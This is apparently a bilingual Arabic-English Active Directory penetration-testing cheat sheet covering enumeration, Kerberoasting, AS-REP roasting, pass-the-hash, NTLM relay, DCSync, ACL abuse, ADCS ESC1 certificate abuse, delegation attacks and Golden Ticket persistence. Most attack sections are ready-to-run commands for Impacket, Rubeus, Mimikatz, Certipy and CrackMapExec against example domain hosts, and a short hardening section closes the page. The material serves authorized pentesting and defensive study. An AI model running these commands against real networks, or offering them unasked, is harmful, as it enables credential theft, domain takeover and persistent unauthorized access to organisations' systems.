Active Directory Pentesting

From Enumeration to Domain Admin Takeover

CRITICAL Enterprise Security 2024-2025 Most Attacked
AR

Active Directory (AD) هو نظام إدارة الهويات والوصول الأساسي في المؤسسات الكبرى والشركات. أكثر من 90% من شركات Fortune 500 تعتمد عليه. اختبار اختراق الـ AD يركز على استغلال أخطاء الإعداد في بروتوكولات Kerberos وNTLM وLDAP، وتتبع مسارات ترقية الصلاحيات من مستخدم عادي لـ Domain Admin.

EN

Active Directory (AD) is Microsoft's enterprise directory service used by over 90% of Fortune 500 companies. AD pentesting focuses on exploiting misconfigurations in Kerberos, NTLM, and LDAP protocols, and chaining privilege escalation paths from a low-privileged user to full Domain Admin takeover.

Phase 1: Enumeration / مرحلة الاستطلاع

🔍

AD Enumeration — BloodHound + PowerView

MITRE: T1087 — Account Discovery
Medium

BloodHound أقوى أداة لاكتشاف مسارات الهجوم في الـ AD. تستخدم Graph Theory لإيجاد أقصر طريق من مستخدم عادي لـ Domain Admin.

🐧 Linux — BloodHound Python
# Collect all data from domain (requires valid creds)
bloodhound-python -d corp.local -u jsmith -p 'P@ssword1' -c All -ns 10.10.10.5

# LDAP enumeration without tools (anonymous)
ldapsearch -x -H ldap://10.10.10.5 -b "DC=corp,DC=local" "(objectClass=*)"

# Enumerate users with AS-REP Roasting vulnerability
kerbrute userenum -d corp.local --dc 10.10.10.5 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt
🪟 Windows — PowerView Enumeration
# Import PowerView
Import-Module .\PowerView.ps1

# Get Domain Info
Get-NetDomain
Get-NetDomainController

# Enumerate all users
Get-NetUser | select samaccountname, description, memberof

# Find computers where current user has local admin
Find-LocalAdminAccess -Verbose

# Find ACL paths to Domain Admins
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "jsmith"}

# Enumerate shares across domain
Invoke-ShareFinder -CheckShareAccess

Phase 2: Hash Attacks / هجمات الهاش

🎫

Kerberoasting

MITRE: T1558.003 — Steal or Forge Kerberos Tickets
Critical

أي مستخدم مصادق في الـ Domain يستطيع طلب TGS Ticket لأي Service Account عنده SPN. الـ Ticket مشفر بـ NTLM hash لكلمة مرور الـ Service Account — يمكن فك تشفيره offline.

  1. استعلام LDAP لجمع كل الـ Service Principal Names (SPNs)
  2. طلب TGS Ticket لكل SPN
  3. استخراج الـ Ticket وفكّ تشفيره بـ Hashcat offline
  4. استخدام الـ Password للتحرك جانبياً (Lateral Movement)
🐧 Linux — Impacket
# Kerberoast all SPNs and save hashes
impacket-GetUserSPNs corp.local/jsmith:'P@ssword1' -dc-ip 10.10.10.5 -request -outputfile kerberoast.hash

# Crack with Hashcat (mode 13100 = Kerberos 5 TGS-REP RC4)
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt --force
🪟 Windows — Rubeus
# Kerberoast all SPNs (outputs in hashcat format)
.\Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Target specific user with AES enabled (stronger ticket)
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /nowrap

# Roast only RC4 tickets (easier to crack)
.\Rubeus.exe kerberoast /tgtdeleg /rc4opsec
🔓

AS-REP Roasting

MITRE: T1558.004 — AS-REP Roasting
High

بعض المستخدمين مضبوط عليهم خيار Do not require Kerberos preauthentication. هذا يسمح بطلب AS-REP بدون كلمة مرور مسبقاً — الـ Hash يكون في الـ Response مباشرة.

🐧 Linux — Impacket
# Find vulnerable users + grab hashes (no creds needed!)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.5 -format hashcat -no-pass

# With valid credentials (enumerate + roast)
impacket-GetNPUsers corp.local/jsmith:'P@ssword1' -dc-ip 10.10.10.5 -request

# Crack with Hashcat (mode 18200 = Kerberos 5 AS-REP)
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
🪟 Windows — Rubeus
# AS-REP Roast all vulnerable users
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# PowerView — find accounts without pre-auth
Get-NetUser -PreauthNotRequired | select samaccountname

Phase 3: Lateral Movement / الحركة الجانبية

🔑

Pass-the-Hash (PtH)

MITRE: T1550.002 — Use Alternate Authentication Material
Critical

NTLM لا يحتاج كلمة المرور النصية للتحقق — الـ Hash نفسه كافٍ. بمجرد الحصول على NTLM Hash لأي مستخدم، يمكن التحرك لكل الأجهزة التي تثق به.

🐧 Linux — CrackMapExec / NetExec
# Spray NTLM hash across entire subnet
crackmapexec smb 10.10.10.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Execute command via PtH
crackmapexec smb 10.10.10.5 -u Administrator -H ':8846f7eaee8fb117ad06bdd830b7586c' -x "whoami"

# Dump SAM database
crackmapexec smb 10.10.10.5 -u Administrator -H ':NTLM_HASH' --sam

# Interactive shell via Evil-WinRM
evil-winrm -i 10.10.10.5 -u Administrator -H '8846f7eaee8fb117ad06bdd830b7586c'
🐧 Linux — Impacket Suite
# PsExec with hash
impacket-psexec corp.local/Administrator@10.10.10.5 -hashes ':8846f7eaee8fb117ad06bdd830b7586c'

# WMIexec with hash (fileless)
impacket-wmiexec corp.local/Administrator@10.10.10.5 -hashes ':NTLM_HASH'

# SMBexec with hash
impacket-smbexec corp.local/Administrator@10.10.10.5 -hashes ':NTLM_HASH'
📡

NTLM Relay + Responder

MITRE: T1557.001 — LLMNR/NBT-NS Poisoning
High

Responder يعمل كـ Rogue Server لالتقاط NTLM Authentication Requests. ثم ntlmrelayx يعيد توجيه هذه الـ Credentials لأجهزة أخرى (Relay) للحصول على صلاحيات مباشرة.

🐧 Linux — Responder + ntlmrelayx
# Terminal 1: Start Responder (listen + capture)
responder -I eth0 -dwv

# Terminal 2: Relay captured hashes to targets (SMB signing disabled)
impacket-ntlmrelayx -tf targets.txt -smb2support

# Relay + execute command
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc BASE64_PAYLOAD"

# Relay to LDAP to create new admin user
impacket-ntlmrelayx -t ldap://10.10.10.5 --add-computer ATTACKPC --escalate-user jsmith

Phase 4: Privilege Escalation / ترقية الصلاحيات

🏛️

DCSync Attack

MITRE: T1003.006 — DCSync
Critical

إذا كان لديك أي من الـ Extended Rights التالية: DS-Replication-Get-Changes + DS-Replication-Get-Changes-All — يمكنك إجبار الـ Domain Controller على إعطائك جميع الـ NTLM Hashes كأنك DC آخر. تنتهي اللعبة هنا.

  1. التحقق من وجود صلاحيات Replication على حسابك
  2. تشغيل secretsdump/Mimikatz لعمل DCSync
  3. استخراج NTLM hash لـ Administrator و krbtgt
  4. استخدام hash الـ Administrator للدخول لكل شيء
  5. استخدام hash الـ krbtgt لعمل Golden Ticket للـ Persistence
🐧 Linux — Impacket secretsdump
# DCSync — dump ALL hashes from DC
impacket-secretsdump corp.local/jsmith:'P@ssword1'@10.10.10.5

# DCSync with NTLM hash (PtH)
impacket-secretsdump corp.local/jsmith@10.10.10.5 -hashes ':NTLM_HASH' -just-dc-user krbtgt

# Just dump NTDS.dit passwords (offline)
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
🪟 Windows — Mimikatz
# DCSync via Mimikatz
mimikatz# lsadump::dcsync /user:Administrator /domain:corp.local
mimikatz# lsadump::dcsync /user:krbtgt /domain:corp.local
mimikatz# lsadump::dcsync /all /csv

# Dump local SAM/LSASS
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam
🎭

ACL / ACE Abuse — WriteDacl, GenericAll, GenericWrite

MITRE: T1222 — File and Directory Permissions Modification
High

BloodHound كثيراً ما يكشف إن مستخدماً عادياً يمتلك صلاحيات مفتوحة على Objects حساسة. مثلاً: GenericAll على حساب Domain Admin = يمكنك تغيير كلمة مروره فوراً.

🪟 Windows — PowerView ACL Abuse
# Find ACLs for a specific user
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "jsmith"}

# GenericAll on user = force password reset
Set-DomainUserPassword -Identity "targetadmin" -AccountPassword (ConvertTo-SecureString 'NewP@ss!' -AsPlainText -Force) -Verbose

# WriteDACL on domain = grant yourself DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity jsmith -Rights DCSync

# GenericWrite on Group = add yourself
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jsmith' -Verbose

🔥 ADCS Attacks (ESC1–ESC8) — أخطر ثغرات 2024-2025

AR

Active Directory Certificate Services (ADCS) هو الـ PKI الخاص بـ Microsoft. إذا كان مضبوطاً بشكل خاطئ (وهذا شائع جداً)، يمكن استخدامه لتصعيد الصلاحيات لـ Domain Admin أو إنشاء Golden Ticket دائم بدون hash الـ krbtgt. ESC1 هو أخطر وأسهل ثغرة في 2024.

EN

ADCS misconfigurations (ESC1–ESC8) are among the most critical and underreported attack vectors. They allow privilege escalation to Domain Admin without needing any hashes, making them undetectable by many legacy EDR solutions.

ESC ID الثغرة الخطورة الشرط
ESC1 Misconfigured Certificate Template (Subject Alternative Name) CRITICAL Any domain user can enroll + SAN allowed
ESC2 Any Purpose Certificate + Enrollment Rights CRITICAL Any domain user enrollment
ESC3 Certificate Request Agent Abuse HIGH Enrollment Agent rights
ESC4 Vulnerable ACLs on Certificate Templates CRITICAL WriteDacl / GenericAll on template
ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Set on CA CRITICAL Any domain user enroll on any template
ESC7 Vulnerable CA ACL (ManageCA) CRITICAL ManageCA permission
ESC8 NTLM Relay to AD CS Web Enrollment CRITICAL Access to ADCS HTTP endpoint
🐧 Linux — Certipy (ESC1 Exploitation)
# Step 1: Find vulnerable templates
certipy find -u jsmith@corp.local -p 'P@ssword1' -dc-ip 10.10.10.5 -vulnerable -stdout

# Step 2: Exploit ESC1 — request cert as Domain Admin
certipy req -u jsmith@corp.local -p 'P@ssword1' -ca corp-DC-CA -template VulnTemplate \
  -upn administrator@corp.local -dc-ip 10.10.10.5

# Step 3: Authenticate with the cert and get NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.5
🪟 Windows — Certify + Rubeus (ESC1)
# Find vulnerable templates
.\Certify.exe find /vulnerable

# Request cert as admin
.\Certify.exe request /ca:dc01\corp-DC-CA /template:VulnTemplate /altname:administrator

# Convert + use cert for PtT
openssl pkcs12 -in cert.pem -keyfile key.pem -export -out admin.pfx
.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt

Kerberos Delegation Attacks

🎪

Unconstrained Delegation

MITRE: T1558 — Steal or Forge Kerberos Tickets
High

جهاز مضبوط عليه Unconstrained Delegation يستطيع التصرف كأي مستخدم تجاه أي Service في الـ Domain. إذا جعلنا الـ DC يتصل بهذا الجهاز (PrinterBug/PetitPotam)، نحصل على TGT خاص بالـ DC.

🪟 Windows — Rubeus + SpoolSample
# Find machines with Unconstrained Delegation
Get-NetComputer -Unconstrained | select name

# Monitor for incoming TGTs on the compromised machine
.\Rubeus.exe monitor /interval:5 /nowrap

# Trigger DC to connect back (PrinterBug)
.\SpoolSample.exe DC01.corp.local COMPROMISED.corp.local

# Import captured DC TGT and request DA ticket
.\Rubeus.exe ptt /ticket:BASE64_TGT
.\Rubeus.exe s4u /ticket:BASE64_DC_TGT /impersonateuser:administrator /msdsspn:cifs/dc01.corp.local /ptt

Phase 5: Persistence / الثبات في الشبكة

👑

Golden & Silver Tickets

MITRE: T1558.001 / T1558.002
Critical

Golden Ticket: يستخدم hash الـ krbtgt لتزوير TGT كامل الصلاحيات لأي مستخدم — صالح 10 سنوات. حتى لو تم تغيير كلمة مرور الـ Administrator لن تفقد الوصول.

Silver Ticket: يستخدم hash لـ Service Account معين لتزوير TGS خاص بـ Service محدد — أصعب اكتشافه من الـ Golden Ticket.

🪟 Windows — Mimikatz Golden Ticket
# Create Golden Ticket (need: krbtgt hash + domain SID)
mimikatz# kerberos::golden /user:FakeAdmin /domain:corp.local /sid:S-1-5-21-XXX-XXX-XXX-500 \
  /krbtgt:KRBTGT_NTLM_HASH /ptt

# Verify ticket in memory
mimikatz# kerberos::list

# Use Golden Ticket immediately
dir \\DC01.corp.local\C$
🐧 Linux — Impacket Golden Ticket
# Create Golden Ticket and save to .ccache
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX-XXX-XXX -domain corp.local FakeAdmin

# Export ticket
export KRB5CCNAME=FakeAdmin.ccache

# Use it
impacket-psexec corp.local/FakeAdmin@DC01.corp.local -k -no-pass

🩸 BloodHound Custom Cypher Queries

هذه الـ Queries تفرّق بين الـ Junior والـ Senior penetration tester — ابحث بها في BloodHound مباشرة.

🎯 Shortest Path to Domain Admin
MATCH p=shortestPath((u:User {name:"JSMITH@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p
🔍 Find All Kerberoastable Users with High-Value Privileges
MATCH (u:User {hasspn:true})-[:MemberOf*1..]->(g:Group)
WHERE g.name =~ ".*(ADMIN|SERVER|BACKUP|EXEC).*"
RETURN u.name, u.description
🏰 Find Computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name STARTS WITH "DC"
RETURN c.name, c.operatingsystem
🎭 Find ACL Paths from Owned Users to DA
MATCH p=shortestPath((n {owned:true})-[r:GenericAll|GenericWrite|WriteOwner|WriteDacl|AddMember|ForceChangePassword*1..]->(m:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p
🖥️ Find High-Value Targets Reachable via PtH
MATCH (c:Computer)-[:HasSession]->(u:User)
WHERE u.admincount = true
RETURN c.name, u.name, u.pwdlastset

🛡️ Defense & Hardening

🔑
Enable Kerberos AES Encryption — disable RC4 استخدام AES256 بدلاً من RC4 يجعل Kerberoasting أصعب بكثير للـ Cracking
🔒
Enable SMB Signing على كل الأجهزة يمنع هجمات NTLM Relay بالكامل — واحدة من أبسط وأهم الإعدادات
🎫
Protected Users Security Group إضافة حسابات DA لـ Protected Users تمنع Kerberoasting, Delegation, NTLM auth تلقائياً
🏛️
Audit ADCS Templates — disable SAN للـ Templates غير الضرورية certipy find -vulnerable على شبكتك لمعرفة مستوى الخطر قبل المهاجم
👁️
Monitor Event ID 4769 (TGS Request) عدد كبير من طلبات TGS في وقت قصير = علامة Kerberoasting — Honey Account effective
🎯
Tiered Administration Model (Tier 0/1/2) DA credentials لا تُستخدم أبداً على workstations — يقلل مساحة الـ Lateral Movement بشكل جذري
